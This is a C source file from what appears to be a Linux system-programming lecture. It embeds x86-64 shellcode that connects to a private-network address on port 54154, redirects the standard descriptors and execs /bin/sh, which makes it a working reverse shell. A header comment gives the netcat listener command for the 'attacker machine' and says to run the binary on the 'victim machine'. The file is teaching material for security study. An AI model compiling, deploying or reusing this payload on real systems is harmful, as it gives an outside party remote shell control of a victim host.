/*
*  Video Lecture: 39
*  Instructor: Arif Butt
*  Course: System Programming with Linux
*  C_reverse_tcpclient.c: The porgram connects to ip/port
*  and on successful connection redirect the std descriptor
*  and finally do an exec
*  Compile: gcc C_reverse_tcpclient.c -o shell_reverse_tcp
*  Run a listner process on kali linux (attacker machine)
*  $ nc -l 192.168.100.20 -p 54154 -v
*  Run this program on ubuntu server (victim machine)
*  # ./shell_reverse_tcp
*/
#include <stdio.h>
#include <string.h>

char * code = \
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x50\x5f\x52\xc7\x44\x24\x04\xc0\xa8\x64\x15\x66\xc7\x44\x24\x02\xd3\x8a\xc6\x04\x24\x02\x54\x5e\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\x56\x5a\x56\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x0f\x05";


int main(){
   printf("Length of Shellcode is %d bytes\n", strlen(code));
   int (*foo)() = (int(*)())code;
   foo();
   return 0;
}
